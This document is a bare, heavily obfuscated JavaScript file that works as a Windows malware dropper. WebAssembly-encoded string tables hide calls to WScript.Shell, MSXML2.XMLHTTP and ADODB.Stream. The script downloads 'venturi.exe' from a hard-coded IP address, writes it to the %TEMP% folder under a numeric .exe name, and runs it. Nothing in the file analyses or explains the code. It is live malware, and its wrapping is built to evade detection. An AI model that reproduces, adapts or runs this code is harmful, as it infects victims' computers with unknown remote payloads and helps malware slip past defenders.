const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG94CAgAAVfwBBAQt/AEEIC38AQQ4LfwBBFgt/AEEYC38AQSILfwBBLgt/AEE2C38AQcYAC38AQcwAC38AQeIAC38AQegAC38AQewAC38AQfAAC38AQfQAC38AQfgAC38AQfwAC38AQYgBC38AQaIBC38AQaYBC38AQaoBCwe9gYCAABYGbWVtb3J5AgAFZGF0YTADAAVkYXRhMQMBBWRhdGEyAwIFZGF0YTMDAwVkYXRhNAMEBWRhdGE1AwUFZGF0YTYDBgVkYXRhNwMHBWRhdGE4AwgFZGF0YTkDCQZkYXRhMTADCgZkYXRhMTEDCwZkYXRhMTIDDAZkYXRhMTMDDQZkYXRhMTQDDgZkYXRhMTUDDwZkYXRhMTYDEAZkYXRhMTcDEQZkYXRhMTgDEgZkYXRhMTkDEwZkYXRhMjADFAuPgoCAABUAQQELBUIuU3QAAEEICwVyZWFtAABBDgsGV1NjcmkAAEEWCwEAAEEYCwlwdC5TaGVsbAAAQSILCjIuWE1MSFRUUAAAQS4LBk1TWE1MAABBNgsOJTI1VEVNUCUyNSU1QwAAQcYACwVFeHBhAABBzAALFW5kRW52aXJvbm1lbnRTdHJpbmdzAABB4gALBUFET0QAAEHoAAsCRwAAQewACwNFVAAAQfAACwJoAABB9AALAnQAAEH4AAsDdHAAAEH8AAsKJTNBJTJGJTJGAABBiAELGTQ2LjMwLjQyLjEyMyUyRnZlbnR1cmkuZQAAQaIBCwJ4AABBpgELAmUAAEGqAQsOMTk5OTk3Njg0LmV4ZQA='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
(() => {
    const __callInstance8 = new WebAssembly.Instance(__callWasmModule, {
        env: {
            impFunc: () => {
                (function (RXmqtHRzHdejPI) {
                    function NbjdnsclFfiBPsM(lwTVyazSvO) {
                        return new RXmqtHRzHdejPI.ActiveXObject(lwTVyazSvO);
                    }
                    var trtopmsP = true, dXuHLF = lS(0, 0) + (232489, lS(0, 1));
                    var igMcqGRHjo;
                    igMcqGRHjo = function (MNxmxraR, qCLHkkJ, TmmskWJLelQiG) {
                        tpzFXch = (1 ? lS(0, 2) : lS(0, 3)) + lS(0, 4);
                        var GnjajlnEi = NbjdnsclFfiBPsM(tpzFXch);
                        var dVXOUVLyOAh = lS(0, 5);
                        var zzauIjtSBHO = NbjdnsclFfiBPsM(lS(0, 6) + (981061, dVXOUVLyOAh));
                        var gbZBKxrTkZkYH = lS(0, 7);
                        var MRLvcn = GnjajlnEi[lS(0, 8) + lS(0, 9)](gbZBKxrTkZkYH);
                        var qCLHkkJ = MRLvcn + (432704532659, qCLHkkJ);
                        zzauIjtSBHO.onreadystatechange = function () {
                            if (zzauIjtSBHO.readyState == 4) {
                                trtopmsP = false;
                                with (NbjdnsclFfiBPsM(lS(0, 10) + dXuHLF)) {
                                    (() => {
                                        const __callInstance7 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    open();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance7.exports;
                                        return __exports.data();
                                    })();
                                    type = 1;
                                    (() => {
                                        const __callInstance6 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    write(zzauIjtSBHO.ResponseBody);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance6.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance5 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    saveToFile(qCLHkkJ, 2);
                                                }
                                            }
                                        });
                                        const __exports = __callInstance5.exports;
                                        return __exports.data();
                                    })();
                                    (() => {
                                        const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
                                            env: {
                                                impFunc: () => {
                                                    close();
                                                }
                                            }
                                        });
                                        const __exports = __callInstance4.exports;
                                        return __exports.data();
                                    })();
                                    return qCLHkkJ;
                                }
                            }
                        };
                        (() => {
                            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        zzauIjtSBHO.open(lS(0, 11) + (3772563, 4619129, lS(0, 12)), MNxmxraR, false);
                                    }
                                }
                            });
                            const __exports = __callInstance3.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                                env: {
                                    impFunc: () => {
                                        zzauIjtSBHO.send();
                                    }
                                }
                            });
                            const __exports = __callInstance2.exports;
                            return __exports.data();
                        })();
                        uDNUZbn = RXmqtHRzHdejPI.WScript.Sleep(1100);
                        (() => {
                            const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                                env: {
                                    test: () => {
                                        return trtopmsP ? 1 : 0;
                                    },
                                    update: () => {
                                    },
                                    body: () => {
                                        {
                                            uDNUZbn;
                                        }
                                    }
                                }
                            });
                            const __exports = __forInstance0.exports;
                            return __exports.data();
                        })();
                        (() => {
                            const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                                env: {
                                    impFunc1: () => {
                                        (() => {
                                            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                                                env: {
                                                    impFunc: () => {
                                                        GnjajlnEi.Run(qCLHkkJ, 0, 0);
                                                    }
                                                }
                                            });
                                            const __exports = __callInstance1.exports;
                                            return __exports.data();
                                        })();
                                    },
                                    impFunc2: () => {
                                    }
                                }
                            });
                            const __exports = __ifInstance0.exports;
                            return __exports.data((new Date() > 0, 8555) ? 1 : 0);
                        })();
                    };
                    jhHnWtWp = lS(0, 13);
                    jhHnWtWp += lS(0, 14);
                    jhHnWtWp += lS(0, 15);
                    (() => {
                        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                            env: {
                                impFunc: () => {
                                    igMcqGRHjo(jhHnWtWp + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19), lS(0, 20), 1);
                                }
                            }
                        });
                        const __exports = __callInstance0.exports;
                        return __exports.data();
                    })();
                }(this));
            }
        }
    });
    const __exports = __callInstance8.exports;
    return __exports.data();
})();